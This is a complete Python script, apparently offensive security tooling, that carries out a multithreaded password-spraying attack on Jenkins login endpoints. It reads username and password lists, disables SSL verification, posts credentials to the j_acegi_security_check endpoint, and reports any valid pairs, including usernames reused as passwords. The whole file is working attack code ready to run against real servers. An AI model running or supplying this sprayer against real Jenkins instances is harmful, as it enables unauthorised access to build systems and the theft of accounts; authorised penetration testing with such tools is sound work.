#!/usr/bin/env python3
import requests
import argparse
import concurrent.futures


# IGNORE SSL WARNING ###########################################################
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# UTILS ########################################################################
def try_login(auth):
    r = SESSION.post(URL + '/j_acegi_security_check', data=auth, verify=False)

    if r.status_code == 200:
        return True

    if r.status_code == 403 and 'X-You-Are-Authenticated-As' in r.headers:
        print('Warning: next user probably misses Global/Read permissions')
        return True

    return False


def spray(user, password=None):

    if password is not None:
        auth = {'j_username':user, 'j_password':password}
        if try_login(auth):
            print('Matching password {} for user {}'.format(password, user))
        return

    password_count = 0
    order = 100
    for password in passwords:
        auth = {'j_username':user, 'j_password':password}
        if try_login(auth):
            print('Matching password {} for user {}'.format(password, user))
            break
        password_count += 1
        if password_count == order:
            print('So far I\'ve tried {} passwords for user {}'.format(order, user))
            order *= 10


# MAIN #########################################################################
parser = argparse.ArgumentParser(description = 'Jenkins password sprayer')
parser.add_argument('url', nargs='+', type=str)
parser.add_argument('-u', '--user', type=str)
parser.add_argument('-U', '--user_file', type=str)
parser.add_argument('-p', '--password', type=str)
parser.add_argument('-P', '--password_file', type=str)
parser.add_argument('-e', '--additional_checks', action='store_true', help='Try username as password')

args = parser.parse_args()
URL = args.url[0]
SESSION = requests.session()

# build the user list
users = []
if args.user_file:
    with open(args.user_file, 'r', errors='replace') as user_file:
        users = user_file.read().splitlines()
if args.user:
    users.append(args.user)

# build the password list
passwords = []
if args.password_file:
    with open(args.password_file, 'r', errors='replace') as password_file:
        passwords = password_file.read().splitlines()
if args.password:
    passwords.append(args.password)

if args.additional_checks == True:
    for user in users:
        spray(user, user)
    exit(0)

if passwords == [] or users == []:
    print('Need users and passwords')
    exit(1)

with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
    executor.map(spray, users)

